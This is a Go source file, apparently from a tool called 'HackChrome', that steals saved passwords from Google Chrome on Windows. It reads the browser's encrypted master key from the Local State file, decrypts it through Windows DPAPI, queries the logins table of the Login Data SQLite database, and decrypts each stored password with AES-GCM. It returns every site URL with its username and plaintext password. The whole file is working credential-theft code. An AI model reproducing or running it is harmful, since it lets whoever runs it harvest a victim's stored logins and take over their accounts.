package core

import (
	"HackChrome/utils"
	"database/sql"
	"encoding/base64"
	"fmt"
	"github.com/tidwall/gjson"
	"io/ioutil"
)

func GetMaster(keyFile string) ([]byte, error) {
	res, _ := ioutil.ReadFile(keyFile)
	masterKey, err := base64.StdEncoding.DecodeString(gjson.Get(string(res), "os_crypt.encrypted_key").String())
	if err != nil {
		return []byte{}, err
	}
	// remove string: DPAPI
	masterKey = masterKey[5:]
	masterKey, err = utils.WinDecrypt(masterKey)
	if err != nil {
		return []byte{}, err
	}
	return masterKey, nil
}

func decryptPassword(pwd, masterKey []byte) ([]byte, error) {
	nounce := pwd[3:15]
	payload := pwd[15:]
	plainPwd, err := utils.AesGCMDecrypt(payload, masterKey, nounce)
	if err != nil {
		return []byte{}, nil
	}
	return plainPwd, nil
}

func GetPwd(pwdDb string, masterKey []byte) (result map[string]map[string]string) {
	result = make(map[string]map[string]string)
	db, err := sql.Open("sqlite3", pwdDb)
	if err != nil {
		fmt.Println(err)
	}
	defer func(db *sql.DB) {
		_ = db.Close()
	}(db)
	rows, err := db.Query(`SELECT action_url, username_value, password_value FROM logins`)
	if rows == nil || err != nil {
		fmt.Println("not found any data.", err)
		return
	}
	for rows.Next() {
		var url string
		var username string
		var encryptedPwd []byte
		_ = rows.Scan(&url, &username, &encryptedPwd)
		decryptedPwd, err := decryptPassword(encryptedPwd, masterKey)
		if err != nil {
			continue
		}
		if len(url) > 0 {
			result[url] = map[string]string{"username": username, "password": string(decryptedPwd)}
		}
	}

	return
}
